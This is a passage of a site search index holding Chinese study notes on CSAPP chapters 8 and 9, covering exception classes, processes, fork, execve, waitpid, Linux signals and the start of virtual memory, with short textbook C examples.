90d\u72b6\u6001\u3002</p> <p>CSAPP \u539f\u4e66\u4e2d\u5c06\u5f02\u5e38\u5206\u4e3a\u4e2d\u65ad\u3001\u9677\u9631\u3001\u6545\u969c\u548c\u7ec8\u6b62\u56db\u7c7b\uff0c\u9664\u4e86\u4e2d\u65ad\u662f\u5f02\u6b65\u7684\uff0c\u5176\u5b83\u90fd\u662f\u540c\u6b65\u7684\uff1a</p> Class Cause Async/Sync Return behavior Interrupt Signal from I/O device Async \u8fd4\u56de\u4e0b\u4e00\u4e2a\u6307\u4ee4\u7684\u5730\u5740 Trap Intentional exception Sync \u8fd4\u56de\u4e0b\u4e00\u4e2a\u6307\u4ee4\u7684\u5730\u5740 Fault Potentially recoverable error Sync \u53ef\u80fd\u8fd4\u56de\u5f53\u524d\u6307\u4ee4\u7684\u5730\u5740 Abort Nonrecoverable error Sync \u65e0\u8fd4\u56de <p>\u6b64\u5904\u5f02\u6b65\u4e0e\u540c\u6b65\u7684\u533a\u522b\u5728\u4e8e\uff0c\u5f02\u5e38\u4ea7\u751f\u539f\u56e0\u5728\u4e8e CPU \u5916\u90e8\u8fd8\u662f\u5185\u90e8</p> <ul> <li>\u4e2d\u65ad\uff0c\u987e\u540d\u601d\u4e49\u4e3a\u5916\u90e8 I/O \u8bbe\u5907\uff0c\u5982\u952e\u76d8\u7b49\uff0c\u5411\u5904\u7406\u5668\u7684\u4e2d\u65ad\u5f15\u811a\u53d1\u9001\u4fe1\u53f7\u6765\u89e6\u53d1\u4e2d\u65ad<ul> <li>CPU \u6267\u884c\u5b8c\u5f53\u524d\u6307\u4ee4\uff0c\u4ece\u7cfb\u7edf\u603b\u7ebf\u4e0a\u8bfb\u53d6\u5f02\u5e38\u53f7\uff0c\u8c03\u7528\u76f8\u5e94\u7684\u4e2d\u65ad\u5904\u7406\u7a0b\u5e8f\u6765\u5904\u7406\u4e2d\u65ad</li> <li>\u4e2d\u65ad\u5904\u7406\u5b8c\u6bd5\u540e\uff0cCPU \u8fd4\u56de\u5e76\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u6761</li> </ul> </li> <li>\u9677\u9631\u662f\u4e00\u79cd\u6545\u610f\u89e6\u53d1\u7684\u5f02\u5e38\uff0c\u5b83\u662f\u4e00\u6761\u6307\u4ee4\u6267\u884c\u7684\u7ed3\u679c<ul> <li>\u9677\u9631\u6700\u91cd\u8981\u7684\u7528\u9014\u662f\u4e3a\u7528\u6237\u7a0b\u5e8f\u548c\u64cd\u4f5c\u7cfb\u7edf\u5185\u6838\u4e4b\u95f4\u63d0\u4f9b\u4e00\u4e2a\u7c7b\u4f3c\u51fd\u6570\u7684\u63a5\u53e3\uff0c\u5f53\u5e94\u7528\u7a0b\u5e8f\u9700\u8981\u8bfb\u53d6\u6587\u4ef6\u6216\u521b\u5efa\u65b0\u8fdb\u7a0b\u65f6\uff0c\u9700\u8981\u4f7f\u7528\u7279\u6b8a\u6307\u4ee4 <code>syscall</code> \u5411\u5185\u6838\u8bf7\u6c42\u670d\u52a1\uff0c <code>syscall</code> \u6307\u4ee4\u5c31\u4f1a\u89e6\u53d1\u4e00\u4e2a\u9677\u9631</li> </ul> </li> <li>\u6545\u969c\u662f\u7531\u9519\u8bef\u60c5\u51b5\u5f15\u8d77\u7684\uff0c\u4e0d\u8fc7\u6545\u969c\u662f\u6709\u53ef\u80fd\u88ab\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u4fee\u590d\u7684<ul> <li>\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u5982\u679c\u80fd\u4fee\u6b63\u8fd9\u4e2a\u9519\u8bef\uff0c\u5b83\u5c31\u5c06\u63a7\u5236\u8fd4\u56de\u5230\u5f15\u8d77\u6545\u969c\u7684\u6307\u4ee4\uff0c\u5e76\u91cd\u65b0\u6267\u884c</li> <li>\u6545\u969c\u5904\u7406\u7a0b\u5e8f\u5982\u679c\u4e0d\u80fd\u4fee\u6b63\u8fd9\u4e2a\u9519\u8bef\uff0c\u5c31\u4f1a\u7ec8\u6b62\u5f15\u8d77\u6545\u969c\u7684\u5e94\u7528\u7a0b\u5e8f</li> </ul> </li> <li>\u7ec8\u6b62\u662f\u7531\u4e0d\u53ef\u6062\u590d\u7684\u81f4\u547d\u9519\u8bef\u5bfc\u81f4\u7684\uff0c\u901a\u5e38\u662f\u4e00\u4e9b\u786c\u4ef6\u9519\u8bef\uff0c\u4f8b\u5982 RAM \u7684\u5947\u5076\u6821\u9a8c\u4f4d\u51fa\u9519<ul> <li>\u5bf9\u4e8e\u8fd9\u7c7b\u786c\u4ef6\u9519\u8bef\uff0c\u7ec8\u6b62\u5904\u7406\u7a0b\u5e8f\u76f4\u63a5\u5c06\u5e94\u7528\u7a0b\u5e8f\u7ec8\u6b62</li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter8/#_2","title":"\u8fdb\u7a0b\u4e0e\u4e0a\u4e0b\u6587","text":"<p>\u8fdb\u7a0b\u5c31\u662f\u4e00\u4e2a\u6b63\u5728\u6267\u884c\u7684\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u5b83\u4f1a\u63d0\u4f9b\u7ed9\u7a0b\u5e8f\u4e00\u79cd\u7a0b\u5e8f\u5728\u72ec\u5360\u4f7f\u7528\u5904\u7406\u5668\u4ee5\u53ca\u5185\u5b58\u7cfb\u7edf\u7684\u5047\u8c61</p> <p>\u903b\u8f91\u63a7\u5236\u6d41</p> <p>\u903b\u8f91\u63a7\u5236\u6d41 (logical control flow) \u662f\u8ba1\u7b97\u673a\u7cfb\u7edf\u4e2d\u7ba1\u7406\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u7684\u4e00\u79cd\u673a\u5236\u3002\u5b83\u7b80\u5355\u6765\u8bf4\u5c31\u662f\u7a0b\u5e8f\u6267\u884c\u7684\u987a\u5e8f\u6216\u6761\u4ef6\u3002</p> <p>\u5bf9\u4e8e\u7a0b\u5e8f\u4e2d\u7684\u6bcf\u4e2a\u8bed\u53e5\uff0c\u5728\u6267\u884c\u4e4b\u524d\uff0c\u8ba1\u7b97\u673a\u90fd\u9700\u8981\u6839\u636e\u903b\u8f91\u63a7\u5236\u6d41\u6765\u5224\u65ad\u662f\u5426\u9700\u8981\u6267\u884c\u8fd9\u4e2a\u8bed\u53e5\u3002\u5982\u679c\u9700\u8981\u6267\u884c\uff0c\u5c31\u987a\u5e8f\u6267\u884c\u8fd9\u4e2a\u8bed\u53e5\uff1b\u5982\u679c\u4e0d\u9700\u8981\u6267\u884c\uff0c\u5c31\u8df3\u8fc7\u8fd9\u4e2a\u8bed\u53e5\uff0c\u7ee7\u7eed\u6267\u884c\u4e0b\u4e00\u4e2a\u8bed\u53e5\u3002</p> <p>\u5e76\u884c\u662f\u4e24\u4e2a\u8fdb\u7a0b\u5728\u4e0d\u540c\u5904\u7406\u5668\u4e0a\u540c\u65f6\u8fd0\u884c\uff0c\u800c\u5e76\u53d1\u662f\u4e24\u4e2a\u8fdb\u7a0b\u5728\u4e00\u4e2a\u5904\u7406\u5668\u4e0a\u4ea4\u66ff\u8fd0\u884c</p> <p>\u4e3a\u4e86\u9650\u5236\u5e94\u7528\u7a0b\u5e8f\u6267\u884c\u67d0\u4e9b\u7279\u6b8a\u7684\u6307\u4ee4\u4ee5\u53ca\u9650\u5236\u5176\u53ef\u4ee5\u8bbf\u95ee\u7684\u5730\u5740\u7a7a\u95f4\u8303\u56f4\uff0c\u5904\u7406\u5668\u901a\u8fc7 Control Register \u7684\u6a21\u5f0f\u4f4d\u6765\u5b9e\u73b0\u8fd9\u4e2a\u529f\u80fd\uff0c\u8be5\u5bc4\u5b58\u5668\u63cf\u8ff0\u4e86\u5f53\u524d\u8fdb\u7a0b\u7684\u6743\u9650\u3002</p> <ul> <li>\u5f53\u8bbe\u7f6e\u4e86\u63a7\u5236\u5bc4\u5b58\u5668\u7684\u6a21\u5f0f\u4f4d\u540e\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f (Kernel Mode) \uff0c\u4e5f\u79f0\u4e3a\u8d85\u7ea7\u7528\u6237\u6a21\u5f0f<ul> <li>\u5bf9\u4e8e\u4e00\u4e2a\u8fd0\u884c\u5728\u5185\u6838\u6a21\u5f0f\u7684\u8fdb\u7a0b\u53ef\u4ee5\u6267\u884c\u6307\u4ee4\u96c6\u4e2d\u7684\u4efb\u4f55\u6307\u4ee4\uff0c\u5e76\u53ef\u4ee5\u8bbf\u95ee\u7cfb\u7edf\u4e2d\u4efb\u610f\u7684\u5185\u5b58\u4f4d\u7f6e</li> </ul> </li> <li>\u5982\u679c\u6ca1\u6709\u8bbe\u7f6e\u6a21\u5f0f\u4f4d\uff0c\u8fdb\u7a0b\u5c31\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f (User Mode) <ul> <li>\u5904\u4e8e\u7528\u6237\u6a21\u5f0f\u7684\u8fdb\u7a0b\u4e0d\u5141\u8bb8\u6267\u884c\u7279\u6743\u6307\u4ee4\uff0c\u5176\u4e2d\u7279\u6743\u6307\u4ee4\u6307\u53ef\u4ee5\u505c\u6b62\u5904\u7406\u5668\u3001\u6539\u53d8\u6a21\u5f0f\u4f4d\u4ee5\u53ca\u53d1\u8d77 I/O \u64cd\u4f5c\u7684\u6307\u4ee4</li> <li>\u9664\u6b64\u4e4b\u5916\uff0c\u7528\u6237\u6a21\u5f0f\u7684\u8fdb\u7a0b\u4e5f\u4e0d\u80fd\u76f4\u63a5\u5f15\u7528\u5185\u6838\u533a\u57df\u7684\u4ee3\u7801\u548c\u6570\u636e\uff0c\u4f46\u53ef\u4ee5\u901a\u8fc7\u7cfb\u7edf\u8c03\u7528\u6765\u95f4\u63a5\u8bbf\u95ee</li> </ul> </li> <li>\u901a\u5e38\uff0c\u5e94\u7528\u7a0b\u5e8f\u4e00\u5f00\u59cb\u8fd0\u884c\u5728\u7528\u6237\u6a21\u5f0f\uff0c\u8fdb\u7a0b\u4ece\u7528\u6237\u6a21\u5f0f\u5207\u6362\u5230\u5185\u6838\u6a21\u5f0f\u9700\u8981\u901a\u8fc7\u4e2d\u65ad\u3001\u6545\u969c\u6216\u8005\u51fd\u6570\u8c03\u7528\u7684\u65b9\u5f0f\u3002\u5f53\u8fd9\u7c7b\u5f02\u5e38\u53d1\u751f\uff0c\u6267\u884c\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5904\u7406\u5f02\u5e38\uff0c\u5904\u7406\u5668\u5c31\u4f1a\u4ece\u7528\u6237\u6a21\u5f0f\u53d8\u4e3a\u5185\u6838\u6a21\u5f0f\uff1b\u5f53\u8fd4\u56de\u5230\u5f15\u7528\u7a0b\u5e8f\u7ee7\u7eed\u6267\u884c\u65f6\uff0c\u53c8\u4f1a\u4ece\u5185\u6838\u6a21\u5f0f\u6539\u56de\u7528\u6237\u6a21\u5f0f</li> </ul> <p>\u5185\u6838\u4e3a\u6bcf\u4e2a\u8fdb\u7a0b\u7ef4\u6301\u4e86\u4e00\u4e2a\u4e0a\u4e0b\u6587\uff0c\u4e0a\u4e0b\u6587\u5c31\u662f\u5185\u5bb9\u91cd\u65b0\u542f\u52a8\u4e00\u4e2a\u88ab\u62a2\u5360\u7684\u8fdb\u7a0b\u6240\u9700\u7684\u72b6\u6001\uff0c\u5b83\u7531\u4e00\u4e9b\u5bf9\u8c61\u7684\u503c\u7ec4\u6210\uff0c\u5305\u62ec\u901a\u7528\u76ee\u7684\u5bc4\u5b58\u5668\u3001\u6d6e\u70b9\u5bc4\u5b58\u5668\u3001\u7a0b\u5e8f\u8ba1\u6570\u5668\u3001\u7528\u6237\u6808\u3001\u72b6\u6001\u5bc4\u5b58\u5668\u3001\u5185\u6838\u6808\u4ee5\u53ca\u5404\u79cd\u5185\u6838\u6570\u636e\u7ed3\u6784\uff0c\u5176\u4e2d\u5185\u6838\u6570\u636e\u7ed3\u6784\u5305\u62ec\u63cf\u8ff0\u5730\u5740\u7a7a\u95f4\u7684\u9875\u8868\u3001\u5305\u542b\u6709\u5173\u5f53\u524d\u8fdb\u7a0b\u4fe1\u606f\u7684\u8fdb\u7a0b\u8868\u4ee5\u53ca\u5305\u542b\u8fdb\u7a0b\u5df2\u6253\u5f00\u6587\u4ef6\u7684\u4fe1\u606f\u8868</p> <p>\u5728\u8fdb\u7a0b\u6267\u884c\u7684\u67d0\u4e9b\u65f6\u523b\uff0c\u5185\u6838\u53ef\u4ee5\u51b3\u5b9a\u62a2\u5360\u5f53\u524d\u8fdb\u7a0b\uff0c\u7136\u540e\u91cd\u65b0\u5f00\u59cb\u6267\u884c\u5148\u524d\u88ab\u62a2\u5360\u7684\u8fdb\u7a0b\uff0c\u8fd9\u79cd\u51b3\u7b56\u79f0\u4e3a\u8fdb\u7a0b\u8c03\u5ea6\uff0c\u662f\u7531\u5185\u6838\u4e2d\u7684\u8c03\u5ea6\u5668\u6765\u6267\u884c\u7684</p> <p>\u5176\u4e2d\uff0c\u4e0a\u4e0b\u6587\u5207\u6362\u5206\u4e3a\u4e09\u6b65\uff1a</p> <ul> <li>\uff08\u4e00\uff09 \u4fdd\u5b58\u5f53\u524d\u8fdb\u7a0b</li> <li>\uff08\u4e8c\uff09 \u6062\u590d\u67d0\u4e2a\u5148\u524d\u88ab\u62a2\u5360\u7684\u8fdb\u7a0b\u7684\u4e0a\u4e0b\u6587</li> <li>\uff08\u4e09\uff09 \u5c06\u63a7\u5236\u4f20\u9012\u7ed9\u8fd9\u4e2a\u65b0\u6062\u590d\u7684\u8fdb\u7a0b</li> </ul>"},{"location":"Accumulation/CSAPP/Chapter8/#_3","title":"\u8fdb\u7a0b\u7684\u521b\u5efa","text":""},{"location":"Accumulation/CSAPP/Chapter8/#fork","title":"\u51fd\u6570 fork","text":"<p>\u521b\u5efa\u8fdb\u7a0b\u9700\u8981\u7528\u5230\u7cfb\u7edf\u51fd\u6570 <code>fork</code></p> <p>\u6211\u4eec\u5728 shell \u4e2d\u8f93\u5165\u547d\u4ee4 <code>./hello</code> \uff0c\u53ef\u4ee5\u628a shell \u770b\u6210\u7236\u8fdb\u7a0b\uff0c\u53ef\u6267\u884c\u7a0b\u5e8f <code>hello</code> \u770b\u6210\u5b50\u8fdb\u7a0b\u3002\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u7236\u8fdb\u7a0b\u901a\u8fc7\u8c03\u7528 <code>fork</code> \u51fd\u6570\u6765\u521b\u5efa\u4e00\u4e2a\u65b0\u7684\u53ef\u4ee5\u8fd0\u884c\u7684\u5b50\u8fdb\u7a0b\u3002</p> <p>\u901a\u5e38\u8c03\u7528\u4e00\u4e2a\u51fd\u6570\u53ea\u4f1a\u8fd4\u56de\u4e00\u6b21\uff0c\u7136\u800c\u51fd\u6570 <code>fork</code> \u8c03\u7528\u4e00\u6b21\u4f1a\u8fd4\u56de\u4e24\u6b21\uff0c\u4e00\u6b21\u662f\u8fd4\u56de\u5230\u7236\u8fdb\u7a0b\uff0c\u53e6\u5916\u4e00\u6b21\u662f\u8fd4\u56de\u5230\u65b0\u521b\u5efa\u7684\u5b50\u8fdb\u7a0b</p> <pre><code>#include&lt;sys/types.h&gt;\n#include&lt;unistd.h&gt;\n#include&lt;stdio.h&gt;\n#include&lt;stdlib.h&gt;\n\n//pid_t fork(void);\n//fork \u51fd\u6570\u7684\u5b9a\u4e49\uff0c\u5728 Linux \u7cfb\u7edf\u4e0a\uff0c\u8fd4\u56de\u503c\u7c7b\u578b pid_t \u5728\u6587\u4ef6 types.h \u4e2d\u5b9a\u4e49\u4e3a int \u7c7b\u578b\n\nint main(){\n        pid_t pid = fork();\n        int x = 1;\n        if(pid==0){\n                printf(\"child:%d\\n\",++x);\n                exit(0);\n        }\n        printf(\"parent:%d\\n\",--x);\n        exit(0);\n}\n\n/* Output\uff1a\n*child:2\n*parent:0\n*/\n</code></pre> <p>\u5f53\u8c03\u7528\u5b50\u8fdb\u7a0b\u65f6\uff0c<code>fork</code> \u8fd4\u56de 0 \uff1b\u8c03\u7528\u7236\u8fdb\u7a0b\u65f6\uff0c<code>fork</code> \u8fd4\u56de\u975e\u96f6\u3002\u7531\u4e8e <code>fork</code> \u672c\u8d28\u662f\u4e00\u4e2a\u590d\u5236\u8fdb\u7a0b\u7684\u51fd\u6570\uff0c\u5b83\u5c06\u7236\u8fdb\u7a0b\u590d\u5236\u4e86\u4e00\u4efd\uff0c\u5e76\u8fd0\u884c\u5728\u4e0d\u540c\u7684 pid \u4e0a\uff0c\u6240\u4ee5\u4e24\u4e2a\u8fd4\u56de\u503c\u5b9e\u9645\u4e0a\u662f\u4e92\u4e0d\u5f71\u54cd\u5730\u6267\u884c\u7684\uff1a</p> <p></p>"},{"location":"Accumulation/CSAPP/Chapter8/#execve","title":"\u51fd\u6570 execve","text":"<p>\u4e0e <code>fork</code> \u51fd\u6570\u4e0d\u540c\u7684\u662f\uff0c<code>execve</code> \u8c03\u7528\u4e4b\u540e\u4e0d\u4f1a\u8fd4\u56de\u3002</p> <p>\u8c03\u7528 <code>execve</code> \u51fd\u6570\u9700\u8981\u4e09\u4e2a\u53c2\u6570\uff0c\u5176\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <pre><code>#include&lt;unistd.h&gt;\nint execve(const char *filename,\n           const char *argv[],\n           const char *envp[]);\n</code></pre> <ul> <li><code>filename</code> \u8868\u793a\u53ef\u6267\u884c\u7a0b\u5e8f\u7684\u6587\u4ef6\u540d</li> <li><code>argv</code> \u8868\u793a\u6267\u884c\u7a0b\u5e8f\u6240\u9700\u8f93\u5165\u7684\u53c2\u6570\u5217\u8868</li> <li><code>envp</code> \u8868\u793a\u73af\u5883\u53d8\u91cf\u5217\u8868</li> </ul> <p>\u73af\u5883\u5217\u8868 <code>envp</code> \u7684\u8f93\u5165\u683c\u5f0f\u53ef\u4ee5\u4e3a <code>[\"pwd=114\",...,\"USER=admin\"]</code></p> <p>\u53ef\u4ee5\u4f7f\u7528\u5982\u4e0b C \u8bed\u8a00\u7a0b\u5e8f\u67e5\u770b\u81ea\u5df1\u7cfb\u7edf\u4e0a\u7684\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>#include &lt;stdio.h&gt;\n\nint main(int argc,char *argv[], char *envp[]){\n    int i;\n    printf(\"Environment variables:\\n\");\n    for(i=0;envp[i]!=0;i++)\n        printf(\"envp[%2d]:%s\\n\",i,envp[i]);\n}\n</code></pre> <p>\u51fd\u6570 <code>execve</code> \u7684\u4f5c\u7528\u5c31\u662f\u8c03\u7528\u52a0\u8f7d\u5668\uff0c\u5728\u6267\u884c\u53ef\u6267\u884c\u7a0b\u5e8f <code>main</code> \u51fd\u6570\u4e4b\u524d\uff0c\u5c06\u53c2\u6570\u4f20\u5165\u3002\u5176\u4e2d\uff0c\u51fd\u6570 <code>main</code> \u7684\u53c2\u6570\u5982\u4e0b\uff1a</p> <pre><code>int main(int argc,char *argv[], char *envp[]);\n</code></pre> <p>\u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570 <code>argc</code> \u8868\u793a\u6570\u7ec4 <code>argv</code> \u4e2d\u975e\u7a7a\u6307\u9488\u7684\u6570\u91cf</p>"},{"location":"Accumulation/CSAPP/Chapter8/#waitpid","title":"\u51fd\u6570 waitpid","text":"<p>\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u7531\u4e8e\u67d0\u79cd\u539f\u56e0\u7ec8\u6b62\u65f6\uff0c\u5185\u6838\u5e76\u4e0d\u662f\u7acb\u5373\u5c06\u5176\u4ece\u7cfb\u7edf\u4e2d\u6e05\u9664\uff0c\u9700\u8981\u7b49\u5f85\u5b83\u7684\u7236\u8fdb\u7a0b\u56de\u6536\uff08\u5b9e\u9645\u4e0a\uff0c\u5927\u90e8\u5206\u5185\u5b58\u5df2\u7ecf\u56de\u6536\uff0c\u4f46\u662f\u4ecd\u4f1a\u6709\u90e8\u5206\u5b58\u7559\u7b49\u5f85\u7236\u8fdb\u7a0b\u56de\u6536\uff09</p> <p>\u4e00\u4e2a\u7ec8\u6b62\u8fd0\u884c\u4f46\u662f\u8fd8\u672a\u88ab\u56de\u6536\u7684\u8fdb\u7a0b\u79f0\u4e3a\u50f5\u6b7b\u8fdb\u7a0b\uff08zombie\uff09</p> <p>\u5728 Linux \u7cfb\u7edf\u4e2d\uff0c\u7236\u8fdb\u7a0b\u53ef\u4ee5\u901a\u8fc7\u51fd\u6570 waitpid \u6765\u7b49\u5f85\u5b83\u7684\u5b50\u8fdb\u7a0b\u7ec8\u6b62\u6216\u505c\u6b62\uff0c\u5176\u53c2\u6570\u5982\u4e0b\uff1a</p> <pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/wait.h&gt;\n\npid_t waitpid(pid_t pid, int *statusp, int options);\n</code></pre> <ul> <li>\u7b2c\u4e00\u4e2a\u53c2\u6570 <code>pid</code> \u6307\u7684\u662f\u76ee\u6807\u5b50\u8fdb\u7a0b\u7684 <code>pid</code><ul> <li>\uff081\uff09<code>pid &gt; 0</code> \uff1a\u7b49\u5f85\u7684\u8fdb\u7a0b\u662f\u4e00\u4e2a\u5355\u72ec\u7684\u5b50\u8fdb\u7a0b\uff0c\u4e14\u5176 ID \u4e3a <code>pid</code> \u7684\u503c</li> <li>\uff082\uff09<code>pid = -1</code> \uff1a\u7b49\u5f85\u7684\u8fdb\u7a0b\u662f\u7531\u7236\u8fdb\u7a0b\u521b\u5efa\u7684\u6240\u6709\u5b50\u8fdb\u7a0b\u7ec4\u6210\u7684\u96c6\u5408</li> </ul> </li> <li>\u7b2c\u4e8c\u4e2a\u53c2\u6570 <code>statusp</code> \u975e\u7a7a\uff0c\u7528\u4e8e\u5b58\u653e\u72b6\u6001\u4fe1\u606f<ul> <li>\u8be5\u53c2\u6570\u4f20\u5165\u7684\u65f6\u5019\u9009\u62e9\u4e00\u4e2a\u6574\u6570\u7c7b\u578b\u7684\u5730\u5740\u5373\u53ef\uff0c\u65e0\u9700\u8d4b\u521d\u503c\uff1a<code>pid=waitpid(-1,&amp;status,0);</code></li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter8/#linux-signal","title":"Linux Signal","text":"<p>Linux \u4fe1\u53f7\u5141\u8bb8\u5185\u6838\u548c\u8fdb\u7a0b\u4e2d\u65ad\u5176\u5b83\u8fdb\u7a0b\uff0c\u90e8\u5206 Linux \u7cfb\u7edf\u652f\u6301\u7684\u4fe1\u53f7\u5217\u8868\u5982\u4e0b\uff1a</p> Number Name Default action Corresponding event 1 SIGHUP Terminate Terminate line hangup 2 SIGINT Terminate Interrupt from keyboard 3 SIGQUIT Terminate Quit from keyboart 4 SIGILL Terminate Illegal instruction 5 SIGTRAP Terminate &amp; dump core Trace trap 8 SIGFPE Terminate &amp; dump core Floating-point exception 9 SIGKILL Terminate Kill program 11 SIGSEGV Terminate &amp; dump core Invalid memory reference 18 SIGCONT Ignore Continue process if stopped <p>\u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c \u5e95\u5c42\u786c\u4ef6\u7684\u5f02\u5e38\u662f\u7531\u5185\u6838\u5f02\u5e38\u5904\u7406\u7a0b\u5e8f\u5904\u7406\u7684\uff0c\u5bf9\u7528\u6237\u4e0d\u53ef\u89c1\u3002\u4fe1\u53f7\u63d0\u4f9b\u4e86\u4e00\u79cd\u673a\u5236\uff0c\u7528\u6765\u901a\u77e5\u7528\u6237\u8fdb\u7a0b\u53d1\u751f\u4e86\u54ea\u4e9b\u5f02\u5e38\u60c5\u51b5\u3002\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u8bd5\u56fe\u6267\u884c\u9664\u4ee5 0 \u7684\u7b97\u6570\u65f6\uff0c\u5185\u6838\u4f1a\u53d1\u9001\u7ed9\u8be5\u8fdb\u7a0b\u4e00\u4e2a <code>SIGFPE</code> \u4fe1\u53f7\uff0c\u544a\u8bc9\u6d6e\u70b9\u5f02\u5e38\u3002</p> <p>\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u53ea\u5c5e\u4e8e\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\uff0c\u6bcf\u4e2a\u8fdb\u7a0b\u7ec4\u90fd\u6709\u81ea\u5df1\u7684 ID \u503c\u4f5c\u4e3a\u552f\u4e00\u6807\u8bc6\uff0c\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570 <code>getpgrp</code> \u6765\u83b7\u53d6\u5f53\u524d\u8fdb\u7a0b\u6240\u5c5e\u7684\u8fdb\u7a0b\u7ec4 ID \u503c\uff0c\u4e14\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5b50\u8fdb\u7a0b\u548c\u5b83\u7684\u7236\u8fdb\u7a0b\u5c5e\u4e8e\u540c\u4e00\u4e2a\u8fdb\u7a0b\u7ec4\u3002</p> <p>\u5411\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7\u7684\u51e0\u79cd\u65b9\u5f0f\u5982\u4e0b\uff1a</p> <ul> <li>\uff08\u4e00\uff09 \u901a\u8fc7 bin \u76ee\u5f55\u4e0b\u7684 <code>kill</code> \u7a0b\u5e8f\u5411\u7a0b\u5e8f\u53d1\u9001\u4efb\u610f\u4fe1\u53f7<ul> <li><code>/bin/kill -9 15213</code> \u8be5\u547d\u4ee4\u5411\u8fdb\u7a0b\u53f7\u4e3a 15213 \u7684\u8fdb\u7a0b\u53d1\u9001\u4fe1\u53f7 9\uff0c\u5373\u6740\u6b7b\u8fdb\u7a0b</li> <li><code>/bin/kill -9 -15213</code> \u4e0e\u4e0a\u9762\u4e0d\u540c\uff0c\u8be5\u547d\u4ee4\u5411\u8fdb\u7a0b\u7ec4 15213 \u4e2d\u7684\u6bcf\u4e00\u4e2a\u8fdb\u7a0b\u90fd\u53d1\u9001\u4fe1\u53f7 9</li> <li>\u6709\u4e9b shell \u5185\u7f6e <code>kill</code> \u547d\u4ee4\uff0c\u4e0d\u9700\u8981\u5f15\u7528\u5b8c\u6574\u8def\u5f84</li> </ul> </li> <li>\uff08\u4e8c\uff09 \u4ece\u952e\u76d8\u53d1\u9001\u4fe1\u53f7<ul> <li>\u6309\u4e0b\u952e\u76d8 ctrl+c \u4f1a\u53d1\u9001\u4e00\u4e2a\u4e2d\u65ad\u4fe1\u53f7\u5230\u524d\u53f0\u8fdb\u7a0b\u7ec4\u7684\u6240\u6709\u8fdb\u7a0b\u4e2d</li> <li>\u6309\u4e0b\u952e\u76d8 ctrl+z \u4f1a\u6302\u8d77\u524d\u53f0\u4f5c\u4e1a</li> </ul> </li> <li>\uff08\u4e09\uff09 \u4f7f\u7528\u51fd\u6570 <code>kill</code><ul> <li>\u51fd\u6570 <code>kill</code> \u5728 C \u8bed\u8a00\u4e2d\u53c2\u6570\u4e3a\uff1a <code>int kill(pid_t pid,int sig);</code></li> <li>\u5982\u679c\u53c2\u6570 <code>pid</code> \u7684\u503c\u5927\u4e8e 0\uff0c\u90a3\u4e48\u51fd\u6570\u53d1\u9001\u4fe1\u53f7 <code>sig</code> \u7ed9\u8be5\u8fdb\u7a0b</li> <li>\u5982\u679c\u53c2\u6570 <code>pid</code> \u7b49\u4e8e 0\uff0c\u90a3\u4e48\u51fd\u6570\u53d1\u9001\u4fe1\u53f7 <code>sig</code> \u7ed9\u8c03\u7528\u8fdb\u7a0b\u6240\u5728\u8fdb\u7a0b\u7ec4\u4e2d\u7684\u6240\u6709\u8fdb\u7a0b\uff08\u5305\u62ec\u8c03\u7528\u8fdb\u7a0b\u81ea\u5df1\uff09</li> <li>\u5982\u679c\u53c2\u6570 <code>pid</code> \u5c0f\u4e8e 0\uff0c\u90a3\u4e48\u51fd\u6570\u53d1\u9001\u4fe1\u53f7 <code>sig</code> \u7ed9\u8fdb\u7a0b\u7ec4 <code>|pid|</code> \u4e2d\u7684\u6bcf\u4e2a\u8fdb\u7a0b</li> </ul> </li> <li>\uff08\u56db\uff09 \u4f7f\u7528\u51fd\u6570 <code>alarm</code><ul> <li>\u5176\u5728 C \u8bed\u8a00\u4e2d\u53c2\u6570\u4e3a\uff1a <code>unsigned int alarm(unsigned int secs);</code></li> <li>\u8fdb\u7a0b\u53ef\u4ee5\u4f7f\u7528\u51fd\u6570 <code>alarm</code> \u5411\u5b83\u81ea\u5df1\u53d1\u9001 <code>SIGALRM</code> \u4fe1\u53f7\uff0c\u5176\u4e2d\u53c2\u6570 <code>secs</code> \u8868\u793a\u591a\u5c11\u79d2\u540e\u53d1\u9001</li> </ul> </li> </ul>"},{"location":"Accumulation/CSAPP/Chapter9/","title":"CH 9. \u865a\u62df\u5185\u5b58","text":""},{"location":"Accumulation/CSAPP/Chapter9/#chapter-9-virtual-memory","title":"Chapter 9. Virtual Memory","text":"<p> \u7ea6 346 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 2 \u5206\u949f</p> <p>\u865a\u62df\u5730\u5740\u672c\u8d28\u662f\u5728\u7269\u7406\u5730\u5740\u548c CPU \u95f4\u589e\u52a0\u4e00\u4e2a\u4e2d\u95f4\u5c42</p> <p>\u865a\u62df\u5185\u5b58\u4f9b\u8f6f\u4ef6\u4f7f\u7528\uff0cCPU \u901a\u8fc7\u865a\u62df\u5730\u5740\u8bbf\u95ee\u6570\u636e\u65f6\uff0c\u7531 MMU \u8f6c\u6362\u6210\u5bf9\u5e94\u7269\u7406\u5730\u5740 </p>"},{"location":"Accumulation/CSAPP/Chapter9/#why-virtual-memory","title":"Why Virtual Memory\uff1f","text":"<p>\u7269\u7406\u7a7a\u95f4\u5730\u5740\u5bf9\u5e94\u7740\u7cfb\u7edf\u4e2d\u5b9e\u9645\u62e5\u6709\u7684 DRAM 